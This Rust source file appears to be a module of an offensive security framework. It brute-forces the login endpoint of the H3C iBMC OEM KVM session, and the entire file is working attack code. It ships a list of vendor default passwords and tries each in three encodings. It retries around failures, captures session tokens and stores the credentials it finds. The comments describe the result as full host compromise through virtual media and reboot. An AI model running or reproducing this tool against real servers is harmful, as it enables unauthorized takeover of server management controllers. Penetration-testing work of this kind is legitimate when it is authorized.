//! H3C iBMC OEM KVM session brute force.
//!
//! H3C iBMC firmware exposes a vendor-specific KVM-session login endpoint at
//!   `POST /api/oem_kvm/session`
//! that:
//!
//!   * accepts credentials in three different encodings — plaintext,
//!     base64, and double-base64 — and silently treats whichever decodes
//!     to a valid string as authoritative;
//!   * returns `200 OK` with an `X-Auth-Token` body field on success and
//!     `401 Unauthorized` on failure;
//!   * has **no rate limiting** (operator confirmed via PoC: thousands of
//!     attempts/sec succeeded with no Retry-After / 429 / lockout);
//!   * is independent of the user-facing :443 web UI lockout state — even
//!     when the standard login is locked, this endpoint still services
//!     attempts.
//!
//! The combination is a complete brute-force-to-virtual-media chain: a
//! discovered KVM credential gives the equivalent of physical console
//! access (mount ISO, BIOS reboot, OS reinstall).
//!
//! This module:
//!   * Tries each `(user, password)` pair in three encodings.
//!   * Honours `Retry-After` if the server *does* surface a 429 (some
//!     hardened builds eventually do).
//!   * Stops on the first successful pair and persists it via the
//!     project-wide credential store.
//!
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{Context, Result, anyhow};
use base64::Engine;
use colored::*;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::network::{HttpClientOpts, build_http_client_with};
use crate::utils::wordlist::BatchedReader;
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_yes_no,
    load_lines, normalize_target,
};

const DEFAULT_PORT: u16 = 443;
const DEFAULT_PATH: &str = "/api/oem_kvm/session";
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Hard cap on the number of (user, password) pairs attempted. Password
/// wordlists are streamed in batches, so this bounds total runtime, not
/// memory — a mistyped huge list can no longer OOM the process or run for
/// days unnoticed.
const MAX_PAIRS: usize = 100_000;
/// Username lists are the outer (materialized) dimension; keep them bounded.
const MAX_USERS: usize = 100_000;
/// Lines per streaming batch for password wordlists.
const PASSWORD_BATCH_SIZE: usize = 1_000;

/// Built-in fallback credential pairs — mostly vendor defaults observed
/// across H3C-OEM hardware deployments. Operators should prefer their own
/// wordlist via `userlist`/`passlist`.
const DEFAULT_CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "Password@_"),
    ("admin", "Password@123"),
    ("admin", "h3capadmin"),
    ("admin", "Admin@9000"),
    ("Administrator", "Admin@9000"),
    ("Administrator", "Administrator"),
    ("sysadmin", "superuser"),
    ("root", "root"),
    ("root", "calvin"),
    ("operator", "operator"),
];

/// Encodings the endpoint accepts. The base64 / double-base64 variants
/// matter because legacy clients post one of these formats and the server
/// normalises them — so a wordlist hit may only fire under a non-plain
/// encoding when the server's password store happens to compare against
/// that decoded form.
#[derive(Clone, Copy, Debug)]
enum Encoding {
    Plain,
    Base64,
    DoubleBase64,
}

impl Encoding {
    fn label(self) -> &'static str {
        match self {
            Encoding::Plain => "plain",
            Encoding::Base64 => "b64",
            Encoding::DoubleBase64 => "b64x2",
        }
    }

    fn encode(self, value: &str) -> String {
        match self {
            Encoding::Plain => value.to_string(),
            Encoding::Base64 => base64::engine::general_purpose::STANDARD.encode(value),
            Encoding::DoubleBase64 => {
                let once = base64::engine::general_purpose::STANDARD.encode(value);
                base64::engine::general_purpose::STANDARD.encode(once)
            }
        }
    }
}

/// How many times to re-attempt a single (user, pass, encoding) when the
/// endpoint returns a transient transport error before giving up on that
/// attempt. Without this, a momentary blip would silently drop a real hit.
const MAX_TRANSIENT_RETRIES: u32 = 3;

/// Outcome of a single login attempt. Distinguishes a transport/transient
/// failure (which must NOT be treated as a denied credential) from a genuine
/// authentication rejection.
enum AttemptResult {
    /// Endpoint returned a session token — credential is valid.
    Hit(String),
    /// Endpoint definitively rejected the credential (401/403 or no token).
    Denied,
    /// Transient transport error (timeout, reset, TLS, connect refused).
    /// Retryable; never counts as a denial.
    Transient(String),
}

fn display_banner() {
    if crate::utils::is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════╗".red()
    );
    crate::mprintln!(
        "{}",
        "║   H3C iBMC OEM KVM Session Brute Force                       ║"
            .red()
            .bold()
    );
    crate::mprintln!(
        "{}",
        "║   POST /api/oem_kvm/session — no rate limit on default builds║".red()
    );
    crate::mprintln!(
        "{}",
        "║   Tries plain / base64 / double-base64 credential encodings  ║".red()
    );
    crate::mprintln!(
        "{}",
        "║   FOR AUTHORIZED TESTING ONLY                                ║".red()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════╝".red()
    );
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "H3C iBMC OEM KVM Session Brute Force".to_string(),
        description: "Brute-forces the H3C iBMC vendor-specific KVM session login at \
                      POST /api/oem_kvm/session, which has no rate limiting on default \
                      firmware builds. Tests every (user, password) pair in plaintext, \
                      base64, and double-base64 encodings — the endpoint silently accepts \
                      all three. A successful hit yields an X-Auth-Token that grants \
                      virtual-media + reboot equivalents (full host compromise)."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
                .to_string(),
            "https://cwe.mitre.org/data/definitions/307.html".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: None,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("h3c_oem_kvm_bruteforce requires a single-host target")?;

    display_banner();

    let mut outcome = ModuleOutcome::ok();
    let normalized = normalize_target(target)?;
    let host_input = if normalized.is_empty() {
        return Err(anyhow!("target is required"));
    } else {
        normalized
    };

    let port =
        cfg_prompt_int_range("port", "Target port", DEFAULT_PORT as i64, 1, 65535).await? as u16;
    let path = cfg_prompt_default("path", "API path", DEFAULT_PATH).await?;
    let timeout_secs = cfg_prompt_int_range(
        "timeout",
        "Per-attempt timeout (seconds)",
        DEFAULT_TIMEOUT_SECS as i64,
        1,
        60,
    )
    .await? as u64;
    let use_defaults = cfg_prompt_yes_no(
        "use_defaults",
        "Try the built-in default credential list?",
        true,
    )
    .await?;
    let load_user_wordlist =
        cfg_prompt_yes_no("user_wordlist", "Load a username wordlist?", false).await?;
    let user_path = if load_user_wordlist {
        Some(cfg_prompt_existing_file("userlist", "Path to username wordlist").await?)
    } else {
        None
    };
    let load_pass_wordlist =
        cfg_prompt_yes_no("pass_wordlist", "Load a password wordlist?", false).await?;
    let pass_path = if load_pass_wordlist {
        Some(cfg_prompt_existing_file("passlist", "Path to password wordlist").await?)
    } else {
        None
    };
    let try_all_encodings = cfg_prompt_yes_no(
        "try_all_encodings",
        "Try plain + base64 + double-base64 for each pair?",
        true,
    )
    .await?;
    let stop_on_hit =
        cfg_prompt_yes_no("stop_on_hit", "Stop on first valid credential?", true).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose (log each attempt)", false).await?;

    // Resolve the candidate dimensions. Usernames are materialized (bounded by
    // MAX_USERS); passwords are STREAMED from disk in batches via
    // BatchedReader, so a rockyou-class list crossed with a username list can
    // never materialize the full cartesian product in memory (the old
    // read_to_string + nested-clone approach OOM'd on exactly that).
    let users: Vec<String> = if let Some(ufile) = user_path.as_ref() {
        let loaded = load_lines(ufile)?;
        if loaded.is_empty() {
            return Err(anyhow!("username wordlist '{}' is empty", ufile));
        }
        if loaded.len() > MAX_USERS {
            return Err(anyhow!(
                "username wordlist '{}' has {} entries (max {}); narrow the list before running",
                ufile,
                loaded.len(),
                MAX_USERS
            ));
        }
        loaded
    } else if pass_path.is_some() {
        // Only a password wordlist was given: default to "admin".
        vec!["admin".to_string()]
    } else {
        Vec::new()
    };

    // Explicit small combos tried before the streamed password dimension:
    // the built-in vendor defaults, plus the classic per-user guesses when a
    // username list was supplied without a password list.
    let mut explicit_pairs: Vec<(String, String)> = Vec::new();
    if use_defaults {
        for (u, p) in DEFAULT_CREDS {
            explicit_pairs.push((u.to_string(), p.to_string()));
        }
    }
    if pass_path.is_none() {
        for u in &users {
            explicit_pairs.push((u.clone(), "admin".to_string()));
            explicit_pairs.push((u.clone(), "password".to_string()));
            explicit_pairs.push((u.clone(), u.clone()));
        }
    }

    if explicit_pairs.is_empty() && pass_path.is_none() {
        return Err(anyhow!(
            "no candidate credentials configured — pick at least defaults or a wordlist"
        ));
    }

    let encodings: Vec<Encoding> = if try_all_encodings {
        vec![Encoding::Plain, Encoding::Base64, Encoding::DoubleBase64]
    } else {
        vec![Encoding::Plain]
    };

    let host = format!("{}:{}", strip_scheme(&host_input), port);
    let client = build_http_client_with(
        Duration::from_secs(timeout_secs),
        HttpClientOpts::permissive_unconditional(),
    )
    .context("Failed to build HTTP client")?;

    let plan_desc = if pass_path.is_some() {
        format!(
            "{} explicit pair(s) + streamed password wordlist over {} user(s) × {} encoding(s)",
            explicit_pairs.len(),
            users.len(),
            encodings.len()
        )
    } else {
        format!(
            "{} pair(s) × {} encoding(s) = {} attempts",
            explicit_pairs.len(),
            encodings.len(),
            explicit_pairs.len() * encodings.len()
        )
    };

    crate::mprintln!(
        "{}",
        format!("[*] Target: https://{}{}  ({})", host, path, plan_desc).cyan()
    );

    let mut found: Vec<(String, String, Encoding, String)> = Vec::new();
    let mut tried = 0u64;
    let mut attempted_pairs = 0usize;
    let mut cap_reached = false;
    let mut stopped = false;

    // Phase A: explicit small combos — built-in vendor defaults and the
    // classic per-user guesses when no password wordlist was supplied.
    for (user, pass) in &explicit_pairs {
        if stopped || ctx.is_cancelled() {
            break;
        }
        if attempted_pairs >= MAX_PAIRS {
            cap_reached = true;
            break;
        }
        attempted_pairs += 1;
        if attempt_pair(
            ctx,
            target,
            &client,
            &host,
            &path,
            port,
            &encodings,
            user,
            pass,
            verbose,
            stop_on_hit,
            &mut found,
            &mut outcome,
            &mut tried,
        )
        .await
        {
            stopped = true;
        }
    }

    // Phase B: stream the password wordlist in bounded batches so a
    // multi-GB list never materializes as (user, pass) pairs in memory.
    if !stopped && pass_path.is_some() {
        let pfile = pass_path.as_ref().context("password wordlist path")?;
        let mut reader = BatchedReader::open_with_batch_size(pfile, PASSWORD_BATCH_SIZE).await?;
        'passwords: while let Some(batch) = reader.next_batch().await? {
            for user in &users {
                for pass in &batch {
                    if ctx.is_cancelled() {
                        break 'passwords;
                    }
                    if attempted_pairs >= MAX_PAIRS {
                        cap_reached = true;
                        break 'passwords;
                    }
                    attempted_pairs += 1;
                    if attempt_pair(
                        ctx,
                        target,
                        &client,
                        &host,
                        &path,
                        port,
                        &encodings,
                        user,
                        pass,
                        verbose,
                        stop_on_hit,
                        &mut found,
                        &mut outcome,
                        &mut tried,
                    )
                    .await
                    {
                        // stop_on_hit fired — leave Phase B immediately. No
                        // further phases read `stopped` after this point.
                        break 'passwords;
                    }
                }
            }
        }
    }

    if cap_reached {
        crate::meprintln!(
            "[!] Attempt cap of {} credential pairs reached — remaining wordlist entries were NOT tested.",
            MAX_PAIRS
        );
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!(
                "H3C iBMC OEM KVM bruteforce on {} stopped after the {}-pair cap; remaining combos were not tested",
                host, MAX_PAIRS
            ),
            data: Some(serde_json::json!({
                "host": host,
                "cap": MAX_PAIRS,
                "attempted_pairs": attempted_pairs,
            })),
        });
    }

    crate::mprintln!();
    crate::mprintln!(
        "{}",
        format!(
            "[*] {} attempts; {} valid credential(s)",
            tried,
            found.len()
        )
        .cyan()
        .bold()
    );

    if found.is_empty() {
        crate::mprintln!("{}", "[-] No valid credentials found.".yellow());
    }

    Ok(outcome)
}

/// Attempt one (user, pass) pair across every configured encoding, retrying
/// transient transport errors with exponential backoff. Pushes a
/// `FindingKind::Credential` finding on a hit and a `FindingKind::Note`
/// finding when a pair could not be tested. Returns `true` when the caller
/// should stop (a valid hit while `stop_on_hit` is set).
async fn attempt_pair(
    ctx: &ModuleCtx,
    target: &str,
    client: &reqwest::Client,
    host: &str,
    api_path: &str,
    port: u16,
    encodings: &[Encoding],
    user: &str,
    pass: &str,
    verbose: bool,
    stop_on_hit: bool,
    found: &mut Vec<(String, String, Encoding, String)>,
    outcome: &mut ModuleOutcome,
    tried: &mut u64,
) -> bool {
    for enc in encodings {
        if ctx.is_cancelled() {
            return false;
        }
        *tried += 1;

        // Retry transient transport errors with exponential backoff so a
        // network blip never masquerades as a denied credential.
        let mut attempt = 0u32;
        let result = loop {
            if ctx.is_cancelled() {
                return false;
            }
            ctx.rate_limit(target).await;
            match try_login(client, host, api_path, user, pass, *enc).await {
                AttemptResult::Transient(msg) if attempt < MAX_TRANSIENT_RETRIES => {
                    attempt += 1;
                    if verbose {
                        crate::mprintln!(
                            "{}",
                            format!(
                                "[~] {}:{} ({}) transient error ({}); retry {}/{}",
                                user,
                                pass,
                                enc.label(),
                                msg,
                                attempt,
                                MAX_TRANSIENT_RETRIES
                            )
                            .dimmed()
                        );
                    }
                    let backoff = Duration::from_millis(250u64 * (1u64 << (attempt - 1)));
                    tokio::time::sleep(backoff).await;
                    continue;
                }
                other => break other,
            }
        };

        match result {
            AttemptResult::Hit(token) => {
                crate::mprintln!(
                    "{}",
                    format!(
                        "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
                        user,
                        pass,
                        enc.label(),
                        token
                    )
                    .green()
                    .bold()
                );
                if crate::cred_store::store_credential(crate::cred_store::NewCred {
                    host,
                    port,
                    service: "https",
                    username: user,
                    secret: pass,
                    cred_type: crate::cred_store::CredType::Password,
                    source_module: "creds/generic/h3c_oem_kvm_bruteforce",
                })
                .await
                .is_none()
                {
                    crate::meprintln!("[!] Failed to store credential");
                }
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Credential,
                    message: format!(
                        "H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}",
                        user,
                        pass,
                        enc.label(),
                        host
                    ),
                    data: Some(serde_json::json!({
                        "service": "https",
                        "port": port,
                        "username": user,
                        "password": pass,
                        "encoding": enc.label(),
                        "token": token,
                    })),
                });
                found.push((user.to_string(), pass.to_string(), *enc, token));
                if stop_on_hit {
                    return true;
                }
            }
            AttemptResult::Denied => {
                if verbose {
                    crate::mprintln!(
                        "{}",
                        format!("[-] {}:{} ({}) — denied", user, pass, enc.label()).dimmed()
                    );
                }
            }
            AttemptResult::Transient(msg) => {
                // Exhausted retries: surface as a Note so the operator
                // knows this pair was NOT actually tested (vs. denied),
                // and never treat it as a clean negative.
                crate::mprintln!(
                    "{}",
                    format!(
                        "[!] {}:{} ({}) — untested after {} transient error(s): {}",
                        user,
                        pass,
                        enc.label(),
                        MAX_TRANSIENT_RETRIES,
                        msg
                    )
                    .yellow()
                );
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Note,
                    message: format!(
                        "H3C iBMC OEM KVM attempt {}:{} ({}) on {} could not be completed (transient error: {}); credential status unknown",
                        user, pass, enc.label(), host, msg
                    ),
                    data: Some(serde_json::json!({
                        "service": "https",
                        "username": user,
                        "password": pass,
                        "encoding": enc.label(),
                        "error": msg,
                        "tested": false,
                    })),
                });
            }
        }
    }
    false
}

/// Single login attempt. Returns an [`AttemptResult`] that lets the caller
/// distinguish a valid credential (`Hit`) from a genuine rejection (`Denied`)
/// and from a transient transport failure (`Transient`) — the latter must be
/// retried rather than silently recorded as "credential not valid".
async fn try_login(
    client: &reqwest::Client,
    host: &str,
    path: &str,
    user: &str,
    pass: &str,
    enc: Encoding,
) -> AttemptResult {
    let url = format!("https://{}{}", host, path);
    let form = [
        ("username", enc.encode(user)),
        ("password", enc.encode(pass)),
        ("free_login", "1".to_string()),
        ("log_type", "1".to_string()),
    ];

    let resp = match client.post(&url).form(&form).send().await {
        Ok(r) => r,
        // Transport-level failures (timeout, connect refused, TLS, reset) are
        // transient: they say nothing about whether the credential is valid.
        Err(e) => return AttemptResult::Transient(format!("send: {e}")),
    };
    let status = resp.status();
    if status.as_u16() == 429 {
        // Honour Retry-After when the server surfaces one (seconds form,
        // capped at 60). A malformed/unreadable header is logged and treated
        // as absent — never silently discarded.
        let wait_secs = match resp.headers().get("Retry-After") {
            Some(v) => match v.to_str() {
                Ok(s) => match s.trim().parse::<u64>() {
                    Ok(secs) => Some(secs),
                    Err(e) => {
                        tracing::debug!("non-numeric Retry-After '{}': {e}", s.trim());
                        None
                    }
                },
                Err(e) => {
                    tracing::debug!("Retry-After header not UTF-8: {e}");
                    None
                }
            },
            None => None,
        };
        if let Some(secs) = wait_secs {
            tokio::time::sleep(Duration::from_secs(secs.min(60))).await;
        }
        // Rate-limited: not a denial — let the caller retry.
        return AttemptResult::Transient("429 rate limited".to_string());
    }
    // 5xx are server-side transient errors, not credential rejections.
    if status.is_server_error() {
        return AttemptResult::Transient(format!("server error {}", status.as_u16()));
    }
    if !status.is_success() {
        // 401/403/etc. — a definitive authentication rejection.
        return AttemptResult::Denied;
    }
    // Capture the token from the response HEADER before consuming the body —
    // Redfish-style BMCs return X-Auth-Token as a header, not (only) in the JSON.
    let header_token = match resp.headers().get("X-Auth-Token").map(|v| v.to_str()) {
        Some(Ok(s)) if !s.is_empty() => Some(s.to_string()),
        Some(Err(e)) => {
            tracing::debug!("X-Auth-Token header not UTF-8: {e}");
            None
        }
        _ => None,
    };
    let body = match crate::utils::network::read_http_body_text_capped(
        resp,
        crate::utils::safe_io::DEFAULT_BODY_CAP,
    )
    .await
    {
        Ok(b) => b,
        // Body read failed mid-stream: transient, not a denial.
        Err(e) => return AttemptResult::Transient(format!("read body: {e}")),
    };
    // Require an actual token VALUE (header or parsed from the body). The old check
    // accepted the bare field NAME "X-Auth-Token" appearing anywhere in the body
    // and fell back to a "(present)" placeholder — both could store a
    // non-credential lifted from an error page.
    match header_token.or_else(|| extract_token(&body)) {
        Some(tok) if !tok.is_empty() => AttemptResult::Hit(tok),
        _ => AttemptResult::Denied,
    }
}

fn extract_token(body: &str) -> Option<String> {
    let needle = "X-Auth-Token";
    let pos = body.find(needle)?;
    let after = &body[pos + needle.len()..];
    let colon = after.find(':')?;
    let mut value_start = colon + 1;
    let bytes = after.as_bytes();
    while value_start < bytes.len() && bytes[value_start].is_ascii_whitespace() {
        value_start += 1;
    }
    if value_start >= bytes.len() {
        return None;
    }
    let rest = &after[value_start..];
    if let Some(stripped) = rest.strip_prefix('"') {
        let val: String = stripped.chars().take_while(|c| *c != '"').collect();
        if val.is_empty() { None } else { Some(val) }
    } else {
        let val: String = rest
            .chars()
            .take_while(|c| !c.is_whitespace() && *c != ',' && *c != '}')
            .collect();
        if val.is_empty() { None } else { Some(val) }
    }
}

fn strip_scheme(host: &str) -> String {
    let mut t = host.trim().to_string();
    for prefix in &["https://", "http://"] {
        if let Some(stripped) = t.strip_prefix(prefix) {
            t = stripped.to_string();
            break;
        }
    }
    if let Some(slash) = t.find('/') {
        t.truncate(slash);
    }
    if let Some(colon) = t.find(':') {
        t.truncate(colon);
    }
    t
}

crate::register_native_module!(
    crate::module::Category::Creds,
    "generic/h3c_oem_kvm_bruteforce",
    native
);
